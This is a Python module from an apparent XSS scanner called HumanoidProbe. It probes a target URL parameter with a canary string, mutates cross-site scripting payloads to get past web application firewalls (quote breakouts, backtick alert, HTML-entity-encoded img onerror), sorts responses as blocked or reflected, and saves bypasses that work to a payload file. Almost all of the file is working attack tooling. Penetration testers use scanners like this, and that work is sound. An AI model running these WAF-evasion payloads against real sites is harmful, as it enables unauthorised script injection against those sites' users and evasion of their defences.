import os
import random
import string
import requests

# ─────────────────────────────────────────────
# detector.py — HumanoidProbe v1.0.12
# CyberSafeLabs | Research & development: @cybermansec
#
# Responsibilities:
#   1. Probe WAF capabilities via canary string
#   2. Generate intelligent context-aware bypass payloads
#   3. Analyse responses — BLOCKED / PASSED / REFLECTED / ERROR
#   4. Store successful bypass payloads back to inventory
# ─────────────────────────────────────────────

BLOCK_STATUS_CODES = [403, 406, 429, 503, 400]

BLOCK_BODY_KEYWORDS = [
    "access denied",
    "blocked",
    "cloudflare",
    "detected as attack",
    "firewall",
    "forbidden",
    "illegal request",
    "incapsula",
    "malicious",
    "modsecurity",
    "not acceptable",
    "request blocked",
    "request rejected",
    "security violation",
    "site protection",
    "sucuri",
    "akamai",
    "barracuda",
    "your request has been blocked",
    "this page cannot be displayed",
    "the requested url was rejected",
    "ddos protection",
    "ray id",
]

_USER_AGENT  = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
_HEADERS     = {"User-Agent": _USER_AGENT}
_PAYLOAD_FILE = os.path.normpath(
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "payloads", "xss.txt")
)


# ── WAF capability probe ──────────────────────────────────────────────────────

def probe_waf_capabilities(url, parameter):
    """
    Send a canary string and analyse how the application handles each
    special character. Returns a capability dict that drives mutation.
    """
    capabilities = {
        "allows_squotes"  : False,
        "allows_quotes"   : False,
        "allows_brackets" : False,
        "allows_parens"   : False,
        "escapes_squotes" : False,
    }

    prefix = "pwn_" + "".join(random.choices(string.ascii_lowercase, k=4))
    canary = f"{prefix}'\"<("

    try:
        response = requests.get(url, params={parameter: canary}, headers=_HEADERS, timeout=10)
        body = response.text

        capabilities["allows_squotes"]  = f"{prefix}'"  in body
        capabilities["allows_quotes"]   = f'{prefix}"'  in body
        capabilities["allows_brackets"] = f"{prefix}<"  in body
        capabilities["allows_parens"]   = f"{prefix}("  in body
        capabilities["escapes_squotes"] = f"{prefix}\\'" in body

        _print_probe_summary(prefix, capabilities)

    except requests.exceptions.Timeout:
        print("  [PROBE] Timeout during capability probe — using defaults")
    except requests.exceptions.ConnectionError:
        print("  [PROBE] Connection error during capability probe — using defaults")
    except Exception as e:
        print(f"  [PROBE] Unexpected error: {e} — using defaults")

    return capabilities


def _print_probe_summary(prefix, caps):
    CYAN  = "\033[96m"
    GREEN = "\033[92m"
    RED   = "\033[91m"
    BOLD  = "\033[1m"
    RESET = "\033[0m"

    def s(allowed):
        return f"{GREEN}allowed{RESET}" if allowed else f"{RED}blocked{RESET}"

    print(f"\n  {CYAN}{BOLD}[PROBE]{RESET} WAF capability analysis complete")
    print(f"  {CYAN}[PROBE]{RESET} Canary prefix : {prefix}")
    print(f"  {CYAN}[PROBE]{RESET} Brackets  <   : {s(caps['allows_brackets'])}")
    print(f"  {CYAN}[PROBE]{RESET} Quotes    \"   : {s(caps['allows_quotes'])}")
    print(f"  {CYAN}[PROBE]{RESET} S.Quotes  '   : {s(caps['allows_squotes'])}")
    print(f"  {CYAN}[PROBE]{RESET} Parens    (   : {s(caps['allows_parens'])}")
    print(f"  {CYAN}[PROBE]{RESET} Escapes   \\'  : {'yes' if caps['escapes_squotes'] else 'no'}\n")


# ── Intelligent payload mutation ──────────────────────────────────────────────

def generate_custom_payload(base_payload, capabilities):
    if not isinstance(base_payload, str):
        return base_payload

    allows_brackets = capabilities.get("allows_brackets", False)
    allows_quotes   = capabilities.get("allows_quotes",   False)
    allows_squotes  = capabilities.get("allows_squotes",  False)
    allows_parens   = capabilities.get("allows_parens",   False)
    escapes_squotes = capabilities.get("escapes_squotes", False)

    mutated = base_payload

    if allows_brackets:
        # Brackets allowed — only fix parens if needed
        pass

    elif not allows_brackets and escapes_squotes:
        # JS context with backslash escaping
        mutated = "\\';alert(1);//"

    elif not allows_brackets and allows_quotes:
        # HTML attribute context — quote breakout
        mutated = '" onmouseover=alert(1) x="'

    elif not allows_brackets and allows_squotes:
        # Single quotes work — mutate based on what payload contains
        if "script" in base_payload.lower():
            # Script tag payload — try JS string termination
            mutated = "';alert(1);//"
        elif "onerror" in base_payload.lower() or "onload" in base_payload.lower():
            # Event handler payload — try attribute injection with single quote
            mutated = "' onmouseover='alert(1)"
        elif "javascript:" in base_payload.lower():
            # JS URI payload — try single quote termination
            mutated = "';alert(1)"
        elif "src=" in base_payload.lower():
            # Tag with src attribute — try breaking attribute
            mutated = "' onerror='alert(1)"
        else:
            # Generic fallback with single quotes
            mutated = "';alert(1);//"

    else:
        # Nothing works — HTML entity encoding
        # Browser decodes after receiving, WAF never sees dangerous chars
        mutated = "&#x3C;img&#x20;src&#x3D;x&#x20;onerror&#x3D;alert&#x60;1&#x60;&#x3E;"

    # Parens blocked — replace alert(1) with backtick form in any scenario
    if not allows_parens:
        mutated = mutated.replace("alert(1)", "alert`1`")
        mutated = mutated.replace("alert('XSS')", "alert`XSS`")

    return mutated


# ── Response analysis ─────────────────────────────────────────────────────────

def analyse_result(result, baseline_length=None):
    """
    Classify a result as BLOCKED, PASSED, REFLECTED, or ERROR.

    Evaluation order — do not change:
    1. Network error
    2. Block status code
    3. Block body keyword
    4. Payload reflection (before baseline check — avoids false negatives)
    5. Baseline length drop
    """
    if not isinstance(result, dict):
        return {"verdict": "ERROR", "reason": "Invalid result format"}

    if result.get("error"):
        result["verdict"] = "ERROR"
        result["reason"]  = str(result["error"])
        return result

    status  = result.get("status_code")
    body    = result.get("response_body", "")
    payload = result.get("payload", "")

    if not isinstance(body, str):
        body = ""

    body_lower = body.lower()

    if isinstance(status, int) and status in BLOCK_STATUS_CODES:
        result["verdict"] = "BLOCKED"
        result["reason"]  = f"HTTP status code {status}"
        return result

    for keyword in BLOCK_BODY_KEYWORDS:
        if keyword.lower() in body_lower:
            result["verdict"] = "BLOCKED"
            result["reason"]  = f"WAF keyword in body: '{keyword}'"
            return result

    if isinstance(payload, str) and payload and payload in body:
        result["verdict"] = "REFLECTED"
        result["reason"]  = "Payload explicitly reflected in response body"
        return result

    response_length = result.get("response_length", len(body))
    if (
        isinstance(baseline_length, int)
        and baseline_length > 0
        and isinstance(response_length, int)
        and response_length < (baseline_length * 0.5)
    ):
        result["verdict"] = "BLOCKED"
        result["reason"]  = (
            f"Response {response_length}b is under 50% of baseline {baseline_length}b"
        )
        return result

    result["verdict"] = "PASSED"
    result["reason"]  = "No block indicators detected"
    return result


# ── Store learned payload ─────────────────────────────────────────────────────

def store_learned_payload(generated_payload):
    """
    Append a confirmed reflected payload to the xss.txt inventory.
    Only called on REFLECTED verdict. Checks for duplicates first.
    Returns True if saved, False if duplicate or error.
    """
    if not isinstance(generated_payload, str) or not generated_payload.strip():
        return False

    payload_clean = generated_payload.strip()

    try:
        if not os.path.exists(_PAYLOAD_FILE):
            os.makedirs(os.path.dirname(_PAYLOAD_FILE), exist_ok=True)

        with open(_PAYLOAD_FILE, "r", encoding="utf-8") as f:
            existing = f.read()

        if payload_clean in existing:
            return False

        needs_header = "# Category: learned_bypasses" not in existing

        with open(_PAYLOAD_FILE, "a", encoding="utf-8") as f:
            if needs_header:
                f.write("\n# Category: learned_bypasses\n")
            f.write(f"{payload_clean}\n")

        GREEN = "\033[92m"
        BOLD  = "\033[1m"
        RESET = "\033[0m"
        print(f"  {GREEN}{BOLD}[LEARNED]{RESET} Bypass saved to inventory: {payload_clean}")
        return True

    except PermissionError:
        print(f"  [LEARNED] Permission denied — cannot write to payload file")
        return False
    except Exception as e:
        print(f"  [LEARNED] Error storing payload: {e}")
        return False


# ── Supporting functions ──────────────────────────────────────────────────────

def analyse_all(results, baseline_length=None):
    if not isinstance(results, list):
        return []
    return [analyse_result(r, baseline_length) for r in results]


def get_baseline_length(url, parameter, timeout=10):
    try:
        response = requests.get(
            url,
            params={parameter: "hello"},
            headers=_HEADERS,
            timeout=timeout
        )
        return len(response.text)
    except requests.exceptions.Timeout:
        print("  [BASELINE] Timeout — continuing without baseline")
        return None
    except requests.exceptions.ConnectionError:
        print("  [BASELINE] Connection error — continuing without baseline")
        return None
    except Exception as e:
        print(f"  [BASELINE] Error: {e}")
        return None
